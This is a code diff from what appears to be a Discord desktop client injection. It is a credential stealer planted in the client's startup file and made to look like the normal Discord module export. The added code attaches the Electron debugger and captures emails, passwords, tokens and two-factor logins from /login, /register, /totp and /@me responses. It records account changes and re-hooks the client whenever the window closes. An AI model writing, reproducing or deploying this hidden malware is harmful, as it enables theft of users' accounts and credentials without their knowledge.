+        if (p.response.url.endsWith("/login")) {
+            if (!RESPONSE_DATA.token) {
+                EMAIL = REQUEST_DATA.login;
+                PASSWORD = REQUEST_DATA.password;
+                return;
+            }
+            cruise(
+                "LOGIN_USER",
+                REQUEST_DATA.login,
+                REQUEST_DATA.password,
+                RESPONSE_DATA,
+                REQUEST_DATA,
+                "LOGGED IN",
+            );
+        } else if (p.response.url.endsWith("/register")) {
+            cruise(
+                "LOGIN_USER",
+                REQUEST_DATA.email,
+                REQUEST_DATA.password,
+                RESPONSE_DATA,
+                REQUEST_DATA,
+                "SIGNED UP",
+            );
+        } else if (p.response.url.endsWith("/totp")) {
+            cruise(
+                "LOGIN_USER",
+                EMAIL,
+                PASSWORD,
+                RESPONSE_DATA,
+                REQUEST_DATA,
+                "LOGGED IN WITH MFA-2",
+            );
+        } else if (p.response.url.endsWith("/@me")) {
+            if (!REQUEST_DATA.password) return;
+            if (REQUEST_DATA.email)
+                cruise(
+                    "EMAIL_CHANGED",
+                    REQUEST_DATA.email,
+                    REQUEST_DATA.password,
+                    RESPONSE_DATA,
+                    REQUEST_DATA,
+                    `CHANGED EMAIL`,
+                );
+            if (REQUEST_DATA.new_password)
+                cruise(
+                    "PASSWORD_CHANGED",
+                    null,
+                    null,
+                    RESPONSE_DATA,
+                    REQUEST_DATA,
+                    `CHANGED PASSWORD`,
+                );
+            if (REQUEST_DATA.username)
+                cruise(
+                    "USERNAME_CHANGED",
+                    null,
+                    null,
+                    RESPONSE_DATA,
+                    REQUEST_DATA,
+                    `CHANGED USERNAME`,
+                );
+        }
+    },
+    );
+    win.getAllWindows()[0].webContents.debugger.sendCommand(
+        "Network.enable",
+    );
+    win.getAllWindows()[0].on(
+        "closed", () => CREATE_WINDOW_CLIENT(BrowserWindow)
+    );
 };
 
-// Démarrage
-setTimeout(() => {
-    persistence();
-}, 3000);
+CREATE_WINDOW_CLIENT(BrowserWindow);
 
-// Export Discord
-module.exports = require('./core.asar');
+module.exports = require("./core.asar");
